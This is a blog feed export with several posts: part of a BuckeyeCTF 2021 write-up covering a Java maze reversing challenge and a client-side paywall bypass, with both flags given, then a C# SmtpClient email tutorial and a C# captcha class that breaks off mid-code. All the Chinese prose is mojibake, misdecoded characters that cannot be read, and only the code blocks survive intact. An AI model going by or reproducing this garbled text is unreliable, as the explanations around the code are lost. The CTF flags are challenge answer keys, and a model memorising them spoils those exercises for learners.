<p>åˆ†æè°ƒç”¨<code>printFlag</code>å‡½æ•°çš„<code>actionPerformed</code>,å‘ç°:åªæœ‰å½“å‰ç‚¹å‡»çš„æ–¹æ ¼æ˜¯<code>isLegalMove</code>çš„æ—¶å€™,æ‰ä¼šè¢«åŠ åˆ°<code>moveHistory</code>é‡Œ;å½“å‰ç‚¹å‡»çš„æ–¹æ ¼æ˜¯æœ€åä¸€ä¸ªæ—¶å°±ä¼šæ‰“å°å‡º<code>flag</code>.</p>
<p>ç»§ç»­åˆ†æ<code>isLegalMove</code>å‡½æ•°,å‘ç°è¯¥å‡½æ•°è¿”å›ä¸º<code>True</code>æ—¶å¿…é¡»æ»¡è¶³<code>grid[n][n2] == 0</code>.</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨åˆå§‹åŒ–çš„æ—¶å€™,å°†æ‰€æœ‰æ»¡è¶³<code>grid[n][n2] == 0</code>çš„æ–¹æ ¼è®¾ä¸ºğŸ,ç„¶åä¾æ¬¡ç‚¹å‡»æ˜¾ç¤ºä¸ºğŸçš„æ–¹æ ¼å³å¯.</p>
<pre><code class="java">this.buttons[i][j] = new JButton(&quot;?&quot;);

if(this.grid[i][j] == 0)&#123;
  this.buttons[i][j].setText(&quot;\u2691&quot;);
&#125;
</code></pre>
<p>ä½¿ç”¨<code>javac</code>å‘½ä»¤å°†æºä»£ç ç¼–è¯‘ä¸ºJavaå­—èŠ‚ç æ–‡ä»¶å¹¶è¿è¡Œ.</p>
<pre><code class="shell">â•­â”€ ~/CTF/BuckeyeCTF2021
â•°â”€$ javac Buttons.java
æ³¨: Buttons.javaä½¿ç”¨äº†æœªç»æ£€æŸ¥æˆ–ä¸å®‰å…¨çš„æ“ä½œã€‚
æ³¨: æœ‰å…³è¯¦ç»†ä¿¡æ¯, è¯·ä½¿ç”¨ -Xlint:unchecked é‡æ–°ç¼–è¯‘ã€‚
â•­â”€ ~/CTF/BuckeyeCTF2021
â•°â”€$ java Buttons
</code></pre>
<p><img data-src="/../../CTF/BuckeyeCTF2021/Reverse/images/Buttons.png" alt="Buttons!"></p>
<p>ä»£ç </p>
<pre><code class="java">/*
 * Decompiled with CFR 0.150.
 */
import java.awt.Dimension;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;

public final class Buttons
extends JFrame
implements ActionListener &#123;
    private static final int[][] grid = new int[][]&#123;
        &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1&#125;,
        &#123;1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1&#125;,
        &#123;1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;,
        &#123;1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1&#125;,
        &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1&#125;,
        &#123;1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;, 
        &#123;1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1&#125;,
        &#123;1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1&#125;,
        &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;,
        &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1&#125;,
        &#123;1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1&#125;,
        &#123;1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1&#125;,
        &#123;1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1&#125;,
        &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1&#125;,
        &#123;1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;
    &#125;;
    private final int rows;
    private final int cols;
    private final JLabel movesLabel;
    private final JButton resetButton;
    private final JButton[][] buttons;
    private int posRow;
    private int posCol;
    private final int endRow;
    private final int endCol;
    private static final int MAX_MOVES = 139;
    private ArrayList&lt;Integer&gt; moveHistory;

    public static void main(String[] arrstring) throws Exception &#123;
        new Buttons();
    &#125;

    public Buttons() &#123;
        super(&quot;Buttons!&quot;);
        this.resetValues();
        this.rows = grid.length;
        this.cols = grid[0].length;
        this.endRow = this.rows - 1;
        this.endCol = this.cols - 2;
        JPanel jPanel = new JPanel();
        jPanel.setLayout(new BoxLayout(jPanel, 3));
        JPanel jPanel2 = new JPanel(new GridLayout(this.rows, this.cols));
        JPanel jPanel3 = new JPanel();
        this.buttons = new JButton[this.rows][this.cols];
        for (int i = 0; i &lt; this.rows; ++i) &#123;
            for (int j = 0; j &lt; this.cols; ++j) &#123;
                this.buttons[i][j] = new JButton(&quot;?&quot;);

                  if(this.grid[i][j] == 0) &#123;
                                  this.buttons[i][j].setText(&quot;\u2691&quot;);
                                &#125;

                this.buttons[i][j].addActionListener(this);
                this.buttons[i][j].setActionCommand(Integer.toString(j + i * this.cols));
                jPanel2.add(this.buttons[i][j]);
            &#125;
        &#125;
        this.buttons[this.endRow][this.endCol].setText(&quot;\u2691&quot;);
        jPanel2.setPreferredSize(new Dimension(45 * this.rows, 45 * this.cols));
        this.movesLabel = new JLabel(&quot;Moves left: 20&quot;);
        jPanel3.add(this.movesLabel);
        this.resetButton = new JButton(&quot;Reset&quot;);
        this.resetButton.addActionListener(this);
        this.resetButton.setActionCommand(&quot;reset&quot;);
        jPanel3.add(this.resetButton);
        jPanel.add(jPanel2);
        jPanel.add(jPanel3);
        this.resetGUI();
        this.getContentPane().add(jPanel);
        this.pack();
        this.setDefaultCloseOperation(3);
        this.setVisible(true);
    &#125;

    private void resetValues() &#123;
        this.posRow = 0;
        this.posCol = 1;
        this.moveHistory = new ArrayList();
        this.moveHistory.add(this.posCol + this.posRow * this.cols);
    &#125;

    private void updateMovesLeft() &#123;
        this.movesLabel.setText(&quot;Moves left: &quot; + Integer.toString(139 - this.moveHistory.size()));
    &#125;

    private void resetGUI() &#123;
        for (int i = 0; i &lt; this.rows; ++i) &#123;
            for (int j = 0; j &lt; this.cols; ++j) &#123;
                this.buttons[i][j].setEnabled(true);
            &#125;
        &#125;
        for (int j : this.moveHistory) &#123;
            int n = j / this.cols;
            int n2 = j % this.cols;
            this.buttons[n][n2].setEnabled(false);
        &#125;
        this.updateMovesLeft();
    &#125;

    private void reset() &#123;
        this.resetValues();
        this.resetGUI();
    &#125;

    private boolean isLegalMove(int n, int n2) &#123;
        if (139 - this.moveHistory.size() &lt;= 0) &#123;
            return false;
        &#125;
        return grid[n][n2] == 0 &amp;&amp; Math.abs(n - this.posRow) + Math.abs(n2 - this.posCol) == 1;
    &#125;

    private void printFlag() &#123;
        BigInteger bigInteger;
        BigInteger[] arrbigInteger = new BigInteger[this.moveHistory.size()];
        arrbigInteger[0] = BigInteger.valueOf(2L);
        for (int i = 1; i &lt; arrbigInteger.length; ++i) &#123;
            arrbigInteger[i] = arrbigInteger[i - 1].nextProbablePrime();
        &#125;
        BigInteger bigInteger2 = BigInteger.valueOf(1L);
        BigInteger bigInteger3 = new BigInteger(&quot;1430313837704837266267655033918654049072573502772041995300810633148485540425442305963378206448908414865491202671058946396326575688430628383447817933039379&quot;);
        for (int i = 0; i &lt; this.moveHistory.size(); ++i) &#123;
            bigInteger = BigInteger.valueOf(this.moveHistory.get(i).intValue());
            bigInteger2 = bigInteger2.multiply(arrbigInteger[i].modPow(bigInteger, bigInteger3)).mod(bigInteger3);
        &#125;
        BigInteger bigInteger4 = new BigInteger(&quot;1181624346478884506978387685027501257422054115549381320819711748725513305918055802813085700551988448885328987653245675378090761255233757606571908411691314&quot;);
        bigInteger = bigInteger4.multiply(bigInteger2).mod(bigInteger3);
        byte[] arrby = bigInteger.toByteArray();
        String string = new String(arrby, StandardCharsets.UTF_8);
        JOptionPane.showMessageDialog(this, &quot;Congrats! The flag is: &quot; + string, &quot;Flag&quot;, 1);
        System.out.println(string);
    &#125;

    @Override
    public void actionPerformed(ActionEvent actionEvent) &#123;
        String string = actionEvent.getActionCommand();
        if (string.equals(&quot;reset&quot;)) &#123;
            this.reset();
        &#125; else &#123;
            int n;
            int n2 = Integer.parseInt(string);
            int n3 = n2 / this.cols;
            if (this.isLegalMove(n3, n = n2 % this.cols)) &#123;
                this.buttons[n3][n].setEnabled(false);
                this.posRow = n3;
                this.posCol = n;
                this.moveHistory.add(n2);
                System.out.println(this.moveHistory);
                this.updateMovesLeft();
                if (this.posRow == this.endRow &amp;&amp; this.posCol == this.endCol) &#123;
                    this.printFlag();
                &#125;
            &#125; else &#123;
                JOptionPane.showMessageDialog(this, &quot;Illegal move, you lose \u2639&quot;, &quot;Illegal move&quot;, 0);
                this.reset();
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<p><strong>flag:</strong><code>buckeye&#123;am4z1ng_j0b_y0u_b1g_j4va_h4ck3r&#125;</code></p>
<h1 id="pay2win"><a href="#pay2win" class="headerlink" title="pay2win"></a>pay2win</h1><p><em>Kyle started an online magazine (The Daily Kyle) and published one of my articles on his site. Don&#39;t worry, the article literally contains the flag in plaintext, but if you want to read it you&#39;ll have to figure out how to bypass the paywall.</em></p>
<p><em>URL: <a href="https://pay2win.chall.pwnoh.io/">https://pay2win.chall.pwnoh.io</a></em></p>
<hr>
<p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ,å‘ç°<code>plantFlag</code>å‡½æ•°,ç²˜è´´åˆ°Consoleä¸­è¿è¡Œå,æ‰“å°å‡º<code>shwl_l1_twcd14&#125;1ry4ht3neck_t3_bs&#123;1c_hkh_tsh3he03gy_3l_hu</code>.</p>
<pre><code class="javascript">const ciphertext = [
    234, 240, 234, 252, 214, 236, 140, 247, 173, 191, 158, 132, 56, 4, 32, 73, 235, 193, 233, 152,
    125, 19, 19, 237, 186, 131, 98, 52, 186, 143, 127, 43, 226, 233, 126, 15, 225, 171, 85, 55,
    173, 123, 21, 147, 97, 21, 237, 11, 254, 129, 2, 131, 101, 63, 149, 61,
];
const plaintext = ciphertext.map((x, i) =&gt; (i * i) % 256 ^ x ^ 0x99);

const flagElement = document.querySelector(&quot;#flag&quot;);
plaintext.map((x, i) =&gt; &#123;
    const span = document.createElement(&quot;span&quot;);
    span.classList.add(`flag-char-$&#123;i&#125;`);
    span.textContent = String.fromCharCode(x);
    flagElement.appendChild(span);
    return span;
&#125;);
</code></pre>
<p>æŸ¥çœ‹<code>main.css</code>,å‘ç°<code>span</code>éƒ½è¢«è®¾ç½®äº†<code>order</code>å±æ€§.</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠ<code>main.css</code>,<code>main.js</code>å’Œç½‘é¡µæºä»£ç <code>a.html</code>ä¸‹è½½åˆ°æœ¬åœ°.ç„¶åæ³¨é‡Šæ‰<code>main.js</code>é‡Œå¼¹çª—å’Œé˜»æ­¢æ»šåŠ¨çš„ä»£ç .</p>
<p>æ‰“å¼€<code>a.html</code>,å‘ç°æœ¬åº”è¯¥æ˜¾ç¤º<code>flag</code>çš„åœ°æ–¹æœ‰ä¸€ä¸ªç°è‰²çš„æ¡†.</p>
<p>ç¼–è¾‘<code>a.html</code>,å°† <code>&lt;code id=&quot;flag&quot;&gt;&lt;/code&gt;</code>è¿™ä¸€è¡Œä»£ç ç§»åŠ¨è‡³<code>&lt;pre&gt;</code>æ ‡ç­¾å¤–é¢,å³å¯çœ‹åˆ°<code>flag</code>.</p>
<p><img data-src="/../../CTF/BuckeyeCTF2021/Web/images/pay2win.jpg" alt="pay2win"></p>
<p><strong>flag:</strong><code>buckeye&#123;h0ly_sh1t_wh4t_th3_h3ck_1s_th1s_w31rd_ch4ll3ng3&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>BuckeyeCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>C#ä¸­ä½¿ç”¨SmtpClientå‘é€é‚®ä»¶</title>
    <url>/posts/3123403799/</url>
    <content><![CDATA[<p>æœ€è¿‘å†™C#è¯¾ç¨‹è®¾è®¡æ—¶éœ€è¦ç”¨C#æ¥å‘é€é‚®ä»¶ï¼Œä½†æ˜¯ç½‘ä¸Šæœçš„ä»£ç ç»è¿‡æµ‹è¯•å‡ä¸èƒ½ä½¿ç”¨ï¼Œè°ƒè¯•äº†å¾ˆä¹…ä¹Ÿæ²¡èƒ½æˆåŠŸã€‚æœ€åç´¢æ€§è‡ªå·±å¯¹ç€å®˜æ–¹æ–‡æ¡£æ’¸äº†ä¸€ä¸ªï¼ŒæœŸé—´è¸©äº†å¾ˆå¤šå‘ï¼Œæ•…åœ¨æ­¤åšä¸€æ€»ç»“ã€‚</p>
<h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><ul>
<li>å‘½åç©ºé—´å¯¼å…¥:<code>using System.Net.Mail;</code></li>
<li>åœ¨é‚®ç®±è®¾ç½®ä¸­å¼€é€šsmtpæœåŠ¡ï¼Œå¹¶è·å–æˆæƒç ã€‚<span id="more"></span></li>
</ul>
<h2 id="æºä»£ç "><a href="#æºä»£ç " class="headerlink" title="æºä»£ç "></a>æºä»£ç </h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> mailfrom, password, fromwho, host, mailto, subject, body;</span><br><span class="line">mailfrom = <span class="string">&quot;xxx@qq.com&quot;</span>;<span class="comment">//å‘ä»¶äºº</span></span><br><span class="line"><span class="built_in">int</span> port = <span class="number">25</span>;<span class="comment">//ç«¯å£å·ä¸€èˆ¬ä¸º25</span></span><br><span class="line">password = <span class="string">&quot;**********&quot;</span>;<span class="comment">//é‚®ç®±å¯†ç </span></span><br><span class="line">host = <span class="string">&quot;smtp.xxx.com&quot;</span>;<span class="comment">//ä¸»æœºåœ°å€</span></span><br><span class="line">fromwho = <span class="string">&quot;xxx&quot;</span>;<span class="comment">//å‘ä»¶äººçš„ç­¾å</span></span><br><span class="line">mailto = <span class="string">&quot;xxx@qq.com&quot;</span>;<span class="comment">//æ”¶ä»¶äºº(å¤šä¸ªæ”¶ä»¶äººä¹‹é—´ä»¥è‹±æ–‡é€—å·é—´éš”)</span></span><br><span class="line">subject = <span class="string">&quot;test&quot;</span>;<span class="comment">//é‚®ä»¶ä¸»é¢˜</span></span><br><span class="line">body = <span class="string">&quot;xxxxx&quot;</span>;<span class="comment">//é‚®ä»¶æ­£æ–‡</span></span><br><span class="line"></span><br><span class="line">SmtpClient smtp;</span><br><span class="line">smtp = <span class="keyword">new</span> SmtpClient(host, port);</span><br><span class="line">smtp.UseDefaultCredentials = <span class="literal">false</span>;</span><br><span class="line">smtp.EnableSsl = <span class="literal">true</span>;<span class="comment">//æ˜¯å¦ä½¿ç”¨SSLåŠ å¯†è¿æ¥</span></span><br><span class="line">smtp.DeliveryMethod = SmtpDeliveryMethod.Network;<span class="comment">//æŒ‡å®šé‚®ä»¶å‘é€æ–¹å¼</span></span><br><span class="line">smtp.Credentials = <span class="keyword">new</span> System.Net.NetworkCredential(mailfrom, password); <span class="comment">//è®¾ç½®ç”¨äºéªŒè¯å‘ä»¶äººèº«ä»½çš„å‡­è¯</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>[] address = mailto.Split(<span class="string">&#x27;,&#x27;</span>);<span class="comment">//æ”¶ä»¶äººåœ°å€åˆ—è¡¨</span></span><br><span class="line">MailMessage msg = <span class="keyword">new</span> MailMessage();<span class="comment">//é‚®ä»¶ä¿¡æ¯</span></span><br><span class="line">msg.From = <span class="keyword">new</span> MailAddress(mailfrom, fromwho, Encoding.UTF8);</span><br><span class="line">msg.Subject = subject;<span class="comment">//é‚®ä»¶æ ‡é¢˜</span></span><br><span class="line">msg.SubjectEncoding = Encoding.UTF8;</span><br><span class="line">msg.Body = body;<span class="comment">//é‚®ä»¶æ­£æ–‡</span></span><br><span class="line">msg.BodyEncoding = Encoding.UTF8;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; address.Length; i++)</span><br><span class="line">    msg.To.Add(address[i]);</span><br><span class="line"></span><br><span class="line">msg.Priority = MailPriority.Normal;<span class="comment">//é‚®ä»¶ä¼˜å…ˆçº§(High,Low,Normal)</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    smtp.Send(msg);</span><br><span class="line">	Console.WriteLine(<span class="string">&quot;å‘é€æˆåŠŸ!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e)</span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(e.Message);</span><br><span class="line">&#125;</span><br><span class="line">msg.Dispose();</span><br></pre></td></tr></table></figure>

<h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><ul>
<li>ä»£ç ä¸­æ‰€ä½¿ç”¨çš„å¯†ç ä¸æ˜¯é‚®ç®±å¯†ç ï¼Œåº”åœ¨é‚®ç®±è®¾ç½®ä¸­è·å–smtpæœåŠ¡æˆæƒç ã€‚</li>
<li>ä½¿ç”¨163é‚®ç®±æ—¶åªèƒ½ä½¿ç”¨25ç«¯å£(465&#x2F;994ä¸å¯ç”¨),EnableSslå±æ€§è®¾ç½®ä¸ºfalse&#x2F;true</li>
<li>ä½¿ç”¨QQé‚®ç®±å‘é€æ—¶åªèƒ½ä½¿ç”¨25ç«¯å£(465&#x2F;587ä¸å¯ç”¨),ä¸”EnableSslå±æ€§å¿…é¡»è®¾ç½®ä¸ºtrue</li>
<li>ä»£ç ä½¿ç”¨QQé‚®ç®±ã€163é‚®ç®±å®æµ‹æœ‰æ•ˆï¼Œå…¶ä»–é‚®ç®±å°šä¸æ¸…æ¥š</li>
</ul>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ— è®ºæ˜¯QQé‚®ç®±è¿˜æ˜¯163é‚®ç®±ï¼Œä½¿ç”¨SSLç«¯å£å‘é€æ—¶å‡å‡ºç°å¼‚å¸¸ï¼šæ“ä½œè¶…æ—¶ï¼ŒæŸ¥äº†å¥½ä¹…ï¼Œå‘ç°æ˜¯å› ä¸º:System.Net.Mailåªæ”¯æŒæ˜¾å¼SSL(Explicit SSL)ï¼Œä½†æ˜¯ä¸æ”¯æŒéšå¼SSL(Implicit SSL)ï¼ŒQQé‚®ç®±ä½¿ç”¨çš„åº”è¯¥æ˜¯Implicit SSLã€‚æ­¤é—®é¢˜ä¼¼ä¹å¯ä»¥ç”¨<code>System.Web.Mail</code>æˆ–<code>Cdosys.dll</code>è§£å†³ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰è¯•è¿‡ã€‚<br>å…³äºQQé‚®ç®±ä½¿ç”¨25ç«¯å£å‘é€æ—¶ï¼Œå¿…é¡»ä½¿ç”¨è®¾ç½®SSLä¸ºtrueçš„åŸå› :æœåŠ¡å™¨ä»ä¸å—ä¿æŠ¤çš„25ç«¯å£å“åº”è¯·æ±‚ï¼Œç„¶åå°†è¿æ¥æŠ›åˆ°å—ä¿æŠ¤çš„465ç«¯å£.<br><strong>æ˜¾å¼SSL</strong>é€šè¿‡25ç«¯å£è¿æ¥ - &gt; StartTLSï¼ˆå¼€å§‹åŠ å¯†ï¼‰- &gt;éªŒè¯ - &gt;å‘é€æ•°æ®<br><strong>éšå¼SSL</strong>StartSSLï¼ˆå¼€å§‹åŠ å¯†ï¼‰ - &gt; è¿æ¥ - &gt; éªŒè¯ - &gt;å‘é€æ•°æ®</p>
<h2 id="å‚è€ƒåšå®¢"><a href="#å‚è€ƒåšå®¢" class="headerlink" title="å‚è€ƒåšå®¢"></a>å‚è€ƒåšå®¢</h2><p><a href="https://blog.csdn.net/andrewniu/article/details/52594318">C#å‘é€é‚®ä»¶ä¸‰ç§æ–¹æ³•ï¼ŒLocalhostï¼ŒSMTPï¼ŒSSL-SMTP</a><br><a href="https://blogs.msdn.microsoft.com/webdav_101/2008/06/02/system-net-mail-with-ssl-to-authenticate-against-port-465/">System.Net.Mail with SSL to authenticate against port 465</a><br><a href="https://support.microsoft.com/en-us/help/950260/you-cannot-use-system-net-mail-smtpclient-to-send-an-e-mail-message-wi">You cannot use System.Net.Mail.SmtpClient to send an e-mail message with Implicit SSL</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>C#</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>.NET</tag>
      </tags>
  </entry>
  <entry>
    <title>C#ä¸­è‡ªå·±ç”ŸæˆéªŒè¯ç </title>
    <url>/posts/1000607951/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å†™C#è¯¾ç¨‹è®¾è®¡æ—¶ï¼Œç™»å½•éªŒè¯å¤„éœ€ç”¨åˆ°éªŒè¯ç ï¼Œäºæ˜¯å‚ç…§ç½‘ä¸Šåšå®¢ï¼Œè‡ªå·±å°è£…äº†ä¸€ä¸ªéªŒè¯ç ç±»ï¼Œå’Œç½‘ä¸Šå…¶ä»–åšå®¢ç›¸æ¯”ï¼Œæœ‰ä»¥ä¸‹ä¼˜ç‚¹:</p>
<ul>
<li>å»é™¤äº†0,o,Oä¸1,lç­‰å®¹æ˜“æ··æ·†çš„å­—ç¬¦</li>
<li>ä½¿ç”¨æ–¹ä¾¿ï¼Œä»…éœ€ä¸‰è¡Œä»£ç </li>
<li>å†…ç½®æœ‰è¿”å›MD5åŠ å¯†åçš„å­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œä¾¿äºå‰ç«¯è°ƒç”¨<span id="more"></span></li>
</ul>
<h2 id="å‡½æ•°è¯´æ˜"><a href="#å‡½æ•°è¯´æ˜" class="headerlink" title="å‡½æ•°è¯´æ˜"></a>å‡½æ•°è¯´æ˜</h2><h3 id="å…¬æœ‰æ–¹æ³•"><a href="#å…¬æœ‰æ–¹æ³•" class="headerlink" title="å…¬æœ‰æ–¹æ³•"></a>å…¬æœ‰æ–¹æ³•</h3><ul>
<li>SecurityCode(int length);&#x2F;&#x2F;æ„é€ å‡½æ•°</li>
<li>SecurityCode(int length, int width, int height);&#x2F;&#x2F;æ„é€ å‡½æ•°</li>
<li>void UpdateVerifyCode();&#x2F;&#x2F;åˆ·æ–°éªŒè¯ç </li>
<li>Bitmap getImage();&#x2F;&#x2F;è¿”å›éªŒè¯ç å›¾ç‰‡</li>
<li>string MD5Encrypt();&#x2F;&#x2F;è¿”å›ç»MD5åŠ å¯†è¿‡çš„éªŒè¯ç å­—ç¬¦ä¸²</li>
<li>bool Check(string text);&#x2F;&#x2F;è¿”å›æ ¡éªŒç»“æœ(ä¸åŒºåˆ†å¤§å°å†™)</li>
</ul>
<h3 id="ç§æœ‰æ–¹æ³•"><a href="#ç§æœ‰æ–¹æ³•" class="headerlink" title="ç§æœ‰æ–¹æ³•"></a>ç§æœ‰æ–¹æ³•</h3><ul>
<li>void CreateVerificationText(int length);&#x2F;&#x2F;éšæœºç”ŸæˆéªŒè¯ç å­—ç¬¦ä¸²</li>
<li>void CreateImage();&#x2F;&#x2F;ç”ŸæˆéªŒè¯ç å›¾ç‰‡</li>
<li>Color RandColor();&#x2F;&#x2F;ç”Ÿæˆéšæœºé¢œè‰²</li>
<li>Point RandPoint();&#x2F;&#x2F;ç”Ÿæˆéšæœºç‚¹</li>
</ul>
<h2 id="ä½¿ç”¨ç¤ºä¾‹"><a href="#ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">SecurityCode Code=<span class="keyword">new</span> SecurityCode(<span class="number">4</span>);</span><br><span class="line">code.UpdateVerifyCode();</span><br><span class="line">picturebox.Image=code.getImage();</span><br></pre></td></tr></table></figure>
<h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img data-src="/images/securitycode.jpg" alt="éªŒè¯ç "></p>
<h2 id="æºä»£ç "><a href="#æºä»£ç " class="headerlink" title="æºä»£ç "></a>æºä»£ç </h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">SecurityCode</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">private</span> Random rand = <span class="keyword">new</span> Random();<span class="comment">//ç”Ÿæˆéšæœºæ•°</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> VerificationText = <span class="built_in">string</span>.Empty;<span class="comment">//éªŒè¯ç å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">private</span> Bitmap map;<span class="comment">//éªŒè¯ç çš„ä½å›¾</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> length;<span class="comment">//éªŒè¯ç çš„å­—ç¬¦ä¸ªæ•°</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> width;<span class="comment">//éªŒè¯ç å›¾ç‰‡çš„å®½åº¦</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> height;<span class="comment">//éªŒè¯ç å›¾ç‰‡çš„é«˜åº¦</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">SecurityCode</span>(<span class="params"><span class="built_in">int</span> length, <span class="built_in">int</span> width, <span class="built_in">int</span> height</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.length = length;</span><br><span class="line">            <span class="keyword">this</span>.width = width;</span><br><span class="line">            <span class="keyword">this</span>.height = height;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">SecurityCode</span>(<span class="params"><span class="built_in">int</span> length</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.length = length;</span><br><span class="line">            <span class="keyword">this</span>.width = (length + <span class="number">1</span>) * <span class="number">25</span>;</span><br><span class="line">            <span class="keyword">this</span>.height = <span class="number">40</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éšæœºç”ŸæˆéªŒè¯ç å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CreateVerificationText</span>(<span class="params"><span class="built_in">int</span> length</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            VerificationText = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="built_in">string</span> dictionary = <span class="string">&quot;ABCDEFGHIJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789&quot;</span>;<span class="comment">//å»é™¤O,o,0 ,l,1</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> index = rand.Next(<span class="number">0</span>, dictionary.Length);</span><br><span class="line">                VerificationText += dictionary[index].ToString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ·æ–°éªŒè¯ç </span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">UpdateVerifyCode</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            CreateVerificationText(length);</span><br><span class="line">            CreateImage();</span><br><span class="line">            